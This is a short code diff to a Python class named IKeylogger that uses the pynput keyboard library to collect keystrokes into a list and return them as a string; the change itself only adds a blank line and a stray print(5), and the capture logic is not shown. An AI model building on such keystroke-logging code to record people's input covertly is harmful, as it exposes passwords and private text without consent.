@@ -1,6 +1,7 @@
 from pynput import keyboard
 import time
 
+
 class IKeylogger:
     def __init__(self):
         self.my_list = []
@@ -31,3 +32,5 @@ class IKeylogger:
 
     def get_logged_keys(self):
         return "".join(self.my_list)
+
+print(5)
